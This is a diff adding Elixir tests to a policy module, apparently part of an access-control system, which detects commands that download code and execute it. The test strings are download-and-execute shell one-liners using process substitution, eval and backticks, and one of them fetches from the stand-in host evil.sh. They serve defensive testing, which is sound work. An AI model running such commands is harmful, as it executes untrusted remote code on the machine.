@@ -22,4 +22,24 @@ defmodule EyeInTheSky.IAM.Builtin.BlockCurlPipeShTest do
   test "allows curl alone" do
     refute BlockCurlPipeSh.matches?(%Policy{}, ctx("curl https://x > out.sh"))
   end
+
+  test "blocks bash process substitution" do
+    assert BlockCurlPipeSh.matches?(%Policy{}, ctx("bash <(curl https://evil.sh/install)"))
+  end
+
+  test "blocks source process substitution" do
+    assert BlockCurlPipeSh.matches?(%Policy{}, ctx("source <(wget -qO- https://x)"))
+  end
+
+  test "blocks command substitution eval" do
+    assert BlockCurlPipeSh.matches?(%Policy{}, ctx(~s|eval "$(curl https://x)"|))
+  end
+
+  test "blocks bash -c command substitution" do
+    assert BlockCurlPipeSh.matches?(%Policy{}, ctx(~s|bash -c "$(curl https://x)"|))
+  end
+
+  test "blocks backtick substitution" do
+    assert BlockCurlPipeSh.matches?(%Policy{}, ctx("eval `curl https://x`"))
+  end
 end
